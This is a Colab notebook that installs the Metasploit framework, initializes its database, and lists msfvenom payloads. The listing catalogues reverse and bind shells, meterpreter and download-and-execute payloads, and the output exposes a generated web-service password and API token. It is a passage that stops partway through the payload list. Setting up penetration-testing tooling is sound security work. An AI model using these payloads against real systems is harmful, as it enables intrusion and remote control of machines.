{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Copy of install_msf.ipynb",
      "version": "0.3.2",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/robomotic/ArduinoMesh/blob/master/Copy_of_install_msf.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "fpztjY3H80r9",
        "colab_type": "text"
      },
      "source": [
        "**Install metasploit framework**\n",
        "\n",
        "Check space before and after"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "DHm64mU185kF",
        "colab_type": "code",
        "outputId": "b8c4b557-800c-4d2a-adb2-be1261f8269c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 154
        }
      },
      "source": [
        "!df -h"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Filesystem      Size  Used Avail Use% Mounted on\n",
            "overlay          49G   26G   22G  55% /\n",
            "tmpfs           6.4G     0  6.4G   0% /dev\n",
            "tmpfs           6.4G     0  6.4G   0% /sys/fs/cgroup\n",
            "tmpfs           6.4G  8.0K  6.4G   1% /var/colab\n",
            "/dev/sda1        55G   27G   29G  49% /etc/hosts\n",
            "shm             6.0G  8.0K  6.0G   1% /dev/shm\n",
            "tmpfs           6.4G     0  6.4G   0% /sys/firmware\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "01IyVaf49BGm",
        "colab_type": "code",
        "outputId": "8ae52fde-8ddf-4d6d-edc5-ca92c5d65119",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 671
        }
      },
      "source": [
        "!curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \\\n",
        "  chmod 755 msfinstall && \\\n",
        "  ./msfinstall"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
            "                                 Dload  Upload   Total   Spent    Left  Speed\n",
            "\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  5532  100  5532    0     0  46487      0 --:--:-- --:--:-- --:--:-- 46487\n",
            "Adding metasploit-framework to your repository list..OK\n",
            "Updating package cache..OK\n",
            "Checking for and installing update..\n",
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "The following package was automatically installed and is no longer required:\n",
            "  libnvidia-common-410\n",
            "Use 'apt autoremove' to remove it.\n",
            "The following NEW packages will be installed:\n",
            "  metasploit-framework\n",
            "0 upgraded, 1 newly installed, 0 to remove and 34 not upgraded.\n",
            "Need to get 217 MB of archives.\n",
            "After this operation, 489 MB of additional disk space will be used.\n",
            "Get:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid/main amd64 metasploit-framework amd64 5.0.38+20190728102530~1rapid7-1 [217 MB]\n",
            "Fetched 217 MB in 3s (70.0 MB/s)\n",
            "Selecting previously unselected package metasploit-framework.\n",
            "(Reading database ... 131331 files and directories currently installed.)\n",
            "Preparing to unpack .../metasploit-framework_5.0.38+20190728102530~1rapid7-1_amd64.deb ...\n",
            "Unpacking metasploit-framework (5.0.38+20190728102530~1rapid7-1) ...\n",
            "Setting up metasploit-framework (5.0.38+20190728102530~1rapid7-1) ...\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfbinscan to provide /usr/bin/msfbinscan (msfbinscan) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfconsole to provide /usr/bin/msfconsole (msfconsole) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfd to provide /usr/bin/msfd (msfd) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfdb to provide /usr/bin/msfdb (msfdb) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfelfscan to provide /usr/bin/msfelfscan (msfelfscan) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfmachscan to provide /usr/bin/msfmachscan (msfmachscan) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfpescan to provide /usr/bin/msfpescan (msfpescan) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfrop to provide /usr/bin/msfrop (msfrop) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfrpc to provide /usr/bin/msfrpc (msfrpc) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfrpcd to provide /usr/bin/msfrpcd (msfrpcd) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfupdate to provide /usr/bin/msfupdate (msfupdate) in auto mode\n",
            "update-alternatives: using /opt/metasploit-framework/bin/msfvenom to provide /usr/bin/msfvenom (msfvenom) in auto mode\n",
            "Run msfconsole to get started\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6JlHFRYd9RzE",
        "colab_type": "code",
        "outputId": "ee2a2625-59bf-4906-df93-ef18918291a9",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 154
        }
      },
      "source": [
        "!df -h"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Filesystem      Size  Used Avail Use% Mounted on\n",
            "overlay          49G   26G   21G  56% /\n",
            "tmpfs           6.4G     0  6.4G   0% /dev\n",
            "tmpfs           6.4G     0  6.4G   0% /sys/fs/cgroup\n",
            "tmpfs           6.4G  8.0K  6.4G   1% /var/colab\n",
            "/dev/sda1        55G   27G   29G  49% /etc/hosts\n",
            "shm             6.0G  8.0K  6.0G   1% /dev/shm\n",
            "tmpfs           6.4G     0  6.4G   0% /sys/firmware\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "cJF1aCQk9lm5",
        "colab_type": "text"
      },
      "source": [
        "**We have to create a non user account now**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Tz7BgQ5P9qdj",
        "colab_type": "code",
        "outputId": "cf77b79d-ac12-457e-d445-18c23faccb8e",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 68
        }
      },
      "source": [
        "!sudo useradd -m msf\n",
        "!passwd msf"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Enter new UNIX password: \n",
            "Retype new UNIX password: \n",
            "passwd: password updated successfully\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "dF-1POSS93z0",
        "colab_type": "text"
      },
      "source": [
        "**Initialize the msf database**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-ZozyZ4V93Gy",
        "colab_type": "code",
        "outputId": "5d4568e1-a96d-49b4-e538-1ef3b2b398db",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 637
        }
      },
      "source": [
        "!su - msf -c \"msfdb init\""
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Creating database at /home/msf/.msf4/db\n",
            "Starting database at /home/msf/.msf4/db...\u001b[1m\u001b[32msuccess\u001b[0m\u001b[0m\n",
            "Creating database users\n",
            "Writing client authentication configuration file /home/msf/.msf4/db/pg_hba.conf\n",
            "Stopping database at /home/msf/.msf4/db\n",
            "Starting database at /home/msf/.msf4/db...\u001b[1m\u001b[32msuccess\u001b[0m\u001b[0m\n",
            "Creating initial database schema\n",
            "\u001b[1m\u001b[34m[?]\u001b[0m\u001b[0m Initial MSF web service account username? [msf]: \n",
            "\u001b[1m\u001b[34m[?]\u001b[0m\u001b[0m Initial MSF web service account password? (Leave blank for random password): \n",
            "Generating SSL key and certificate for MSF web service\n",
            "Attempting to start MSF web service...\u001b[1m\u001b[32msuccess\u001b[0m\u001b[0m\n",
            "MSF web service started and online\n",
            "Creating MSF web service user msf\n",
            "\n",
            "\u001b[36m    ############################################################\u001b[0m\n",
            "\u001b[36m    ##              \u001b[0m\u001b[4m\u001b[1m\u001b[36mMSF Web Service Credentials\u001b[0m\u001b[0m\u001b[0m\u001b[36m               ##\u001b[0m\n",
            "\u001b[36m    ##                                                        ##\u001b[0m\n",
            "\u001b[36m    ##        Please store these credentials securely.        ##\u001b[0m\n",
            "\u001b[36m    ##    You will need them to connect to the webservice.    ##\u001b[0m\n",
            "\u001b[36m    ############################################################\u001b[0m\n",
            "\n",
            "\u001b[1m\u001b[36mMSF web service username\u001b[0m\u001b[0m: msf\n",
            "\u001b[1m\u001b[36mMSF web service password\u001b[0m\u001b[0m: NC+HYqt6Vp0K/5HlBhmUJ4qmMPq+LqPO9SB7/d1TgCE=\n",
            "\u001b[1m\u001b[36mMSF web service user API token\u001b[0m\u001b[0m: 31c25301d2d0db0ba129dec15c8fc74520d77dd1d21e20ee78c0a0d431f8d98f73caa762586de193\n",
            "\n",
            "\n",
            "MSF web service configuration complete\n",
            "The web service has been configured as your default data service in msfconsole with the name \"local-https-data-service\"\n",
            "\n",
            "If needed, manually reconnect to the data service in msfconsole using the command:\n",
            "db_connect --token 31c25301d2d0db0ba129dec15c8fc74520d77dd1d21e20ee78c0a0d431f8d98f73caa762586de193 --cert /home/msf/.msf4/msf-ws-cert.pem --skip-verify https://localhost:5443\n",
            "\n",
            "The username and password are credentials for the API account:\n",
            "https://localhost:5443/api/v1/auth/account\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zOlkI_5D9vBk",
        "colab_type": "code",
        "outputId": "775792d4-156e-4247-f966-ef09ee0181c8",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 154
        }
      },
      "source": [
        "!df -h"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Filesystem      Size  Used Avail Use% Mounted on\n",
            "overlay          49G   26G   21G  56% /\n",
            "tmpfs           6.4G     0  6.4G   0% /dev\n",
            "tmpfs           6.4G     0  6.4G   0% /sys/fs/cgroup\n",
            "tmpfs           6.4G  8.0K  6.4G   1% /var/colab\n",
            "/dev/sda1        55G   27G   29G  49% /etc/hosts\n",
            "shm             6.0G   12K  6.0G   1% /dev/shm\n",
            "tmpfs           6.4G     0  6.4G   0% /sys/firmware\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ADvV7V00-AfE",
        "colab_type": "code",
        "outputId": "c6714d4c-93eb-4983-e143-cf82406f385c",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 243
        }
      },
      "source": [
        "!msfupdate"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Updating package cache..W: Failed to fetch http://ppa.launchpad.net/marutter/c2d4u3.5/ubuntu/dists/bionic/InRelease  Could not connect to ppa.launchpad.net:80 (91.189.95.83), connection timed out [IP: 91.189.95.83 80]\n",
            "W: Some index files failed to download. They have been ignored, or old ones used instead.\n",
            "OK\n",
            "Checking for and installing update..\n",
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "metasploit-framework is already the newest version (5.0.38+20190728102530~1rapid7-1).\n",
            "The following package was automatically installed and is no longer required:\n",
            "  libnvidia-common-410\n",
            "Use 'apt autoremove' to remove it.\n",
            "0 upgraded, 0 newly installed, 0 to remove and 34 not upgraded.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lkkp5KED-RmU",
        "colab_type": "code",
        "outputId": "ce91e40f-5be1-4476-b9c5-16fd779041af",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        }
      },
      "source": [
        "!msfvenom --list payloads"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "\n",
            "Framework Payloads (545 total) [--payload <value>]\n",
            "==================================================\n",
            "\n",
            "    Name                                                Description\n",
            "    ----                                                -----------\n",
            "    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\n",
            "    aix/ppc/shell_find_port                             Spawn a shell on an established connection\n",
            "    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)\n",
            "    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP\n",
            "    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS\n",
            "    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager\n",
            "    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell\n",
            "    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell\n",
            "    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell\n",
            "    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP\n",
            "    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS\n",
            "    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager\n",
            "    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)\n",
            "    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)\n",
            "    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)\n",
            "    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell\n",
            "    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\n",
            "    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\n",
            "    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\n",
            "    bsd/sparc/shell_bind_tcp                            Listen for a connection and spawn a command shell\n",
            "    bsd/sparc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\n",
            "    bsd/vax/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    bsd/x64/exec                                        Execute an arbitrary command\n",
            "    bsd/x64/shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6\n",
            "    bsd/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port\n",
            "    bsd/x64/shell_bind_tcp_small                        Listen for a connection and spawn a command shell\n",
            "    bsd/x64/shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6\n",
            "    bsd/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    bsd/x64/shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell\n",
            "    bsd/x86/exec                                        Execute an arbitrary command\n",
            "    bsd/x86/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service\n",
            "    bsd/x86/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service\n",
            "    bsd/x86/shell/bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6\n",
            "    bsd/x86/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection\n",
            "    bsd/x86/shell/find_tag                              Spawn a command shell (staged). Use an established connection\n",
            "    bsd/x86/shell/reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6\n",
            "    bsd/x86/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker\n",
            "    bsd/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell\n",
            "    bsd/x86/shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6\n",
            "    bsd/x86/shell_find_port                             Spawn a shell on an established connection\n",
            "    bsd/x86/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)\n",
            "    bsd/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    bsd/x86/shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6\n",
            "    bsdi/x86/shell/bind_tcp                             Spawn a command shell (staged). Listen for a connection\n",
            "    bsdi/x86/shell/reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker\n",
            "    bsdi/x86/shell_bind_tcp                             Listen for a connection and spawn a command shell\n",
            "    bsdi/x86/shell_find_port                            Spawn a shell on an established connection\n",
            "    bsdi/x86/shell_reverse_tcp                          Connect back to attacker and spawn a command shell\n",
            "    cmd/mainframe/apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecured/updateable APF authorized library (APFLIB) and updating the user's ACEE using this program/library. Note: This privesc only works with z/OS systems using RACF, no other ESM is supported.)\n",
            "    cmd/mainframe/bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\n",
            "    cmd/mainframe/generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0. This can be used as a template for other JCL based payloads\n",
            "    cmd/mainframe/reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\n",
            "    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK\n",
            "    cmd/unix/bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetd\n",
            "    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)\n",
            "    cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua\n",
            "    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat\n",
            "    cmd/unix/bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat\n",
            "    cmd/unix/bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat\n",
            "    cmd/unix/bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs\n",
            "    cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl\n",
            "    cmd/unix/bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl\n",
            "    cmd/unix/bind_r                                     Continually listen for a connection and spawn a command shell via R\n",
            "    cmd/unix/bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby\n",
            "    cmd/unix/bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby\n",
            "    cmd/unix/bind_socat_udp                             Creates an interactive shell via socat\n",
            "    cmd/unix/bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)\n",
            "    cmd/unix/bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.\n",
            "    cmd/unix/generic                                    Executes the supplied command\n",
            "    cmd/unix/interact                                   Interacts with a shell on an established socket connection\n",
            "    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections\n",
            "    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK\n",
            "    cmd/unix/reverse_bash                               Creates an interactive shell via bash's builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.\n",
            "    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL.\n",
            "    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash's builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.\n",
            "    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn't usually installed by default.\n",
            "    cmd/unix/reverse_lua                                Creates an interactive shell via Lua\n",
            "    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode\n",
            "    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat\n",
            "    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat\n",
            "    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs\n",
            "    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections\n",
            "    cmd/unix/reverse_perl                               Creates an interactive shell via perl\n",
            "    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL\n",
            "    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL\n",
            "    cmd/unix/reverse_python                             Connect back and create a command shell via Python\n",
            "    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.\n",
            "    cmd/unix/reverse_r                                  Connect back and create a command shell via R\n",
            "    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby\n",
            "    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL\n",
            "    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat\n",
            "    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via \"-z\" option\n",
            "    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)\n",
            "    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.\n",
            "    cmd/windows/adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\n",
            "    cmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua\n",
            "    cmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)\n",
            "    cmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)\n",
            "    cmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby\n",
            "    cmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.\n",
            "    cmd/windows/download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it\n",
            "    cmd/windows/generic                                 Executes the supplied command\n",
            "    cmd/windows/powershell_bind_tcp                     Interacts with a powershell session on an established socket connection\n",
            "    cmd/windows/powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection\n",
            "    cmd/windows/reverse_lua                             Creates an interactive shell via Lua\n",
            "    cmd/windows/reverse_perl                            Creates an interactive shell via perl\n",
            "    cmd/windows/reverse_powershell                      Connect back and create a command shell via Powershell\n",
            "    cmd/windows/reverse_ruby                            Connect back and create a command shell via Ruby\n",
            "    firefox/exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript \"launcher\" to disk that hides the prompt.\n",
            "    firefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API\n",
            "    firefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API\n",
            "    generic/custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.\n",
            "    generic/debug_trap                                  Generate a debug trap in the target process\n",
            "    generic/shell_bind_tcp                              Listen for a connection and spawn a command shell\n",
            "    generic/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    generic/tight_loop                                  Generate a tight loop in the target process\n",
            "    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell\n",
            "    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell\n",
            "    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection\n",
            "    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP\n",
            "    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS\n",
            "    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager\n",
            "    java/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection\n",
            "    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager\n",
            "    java/shell_reverse_tcp                              Connect back to attacker and spawn a command shell\n",
            "    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker\n",
            "    linux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell\n",
            "    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/armbe/shell_bind_tcp                          Listen for a connection and spawn a command shell\n",
            "    linux/armle/adduser                                 Create a new user with UID 0\n",
            "    linux/armle/exec                                    Execute an arbitrary command\n",
            "    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection\n",
            "    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/armle/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/armle/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/armle/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/armle/shell/bind_tcp                          dup2 socket in r12, then execve. Listen for a connection\n",
            "    linux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker\n",
            "    linux/armle/shell_bind_tcp                          Connect to target and spawn a command shell\n",
            "    linux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\n",
            "    linux/mips64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mips64/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mips64/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsbe/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.\n",
            "    linux/mipsbe/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/mipsbe/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsbe/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsbe/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsbe/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executing other payloads that rely on initial startup procedures.\n",
            "    linux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\n",
            "    linux/mipsbe/shell_bind_tcp                         Listen for a connection and spawn a command shell\n",
            "    linux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\n",
            "    linux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.\n",
            "    linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.\n",
            "    linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\n",
            "    linux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell\n",
            "    linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\n",
            "    linux/ppc/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppc/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppc/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppc/shell_bind_tcp                            Listen for a connection and spawn a command shell\n",
            "    linux/ppc/shell_find_port                           Spawn a shell on an established connection\n",
            "    linux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\n",
            "    linux/ppc64/shell_bind_tcp                          Listen for a connection and spawn a command shell\n",
            "    linux/ppc64/shell_find_port                         Spawn a shell on an established connection\n",
            "    linux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\n",
            "    linux/ppc64le/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppc64le/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppc64le/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppce500v2/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppce500v2/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/ppce500v2/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\n",
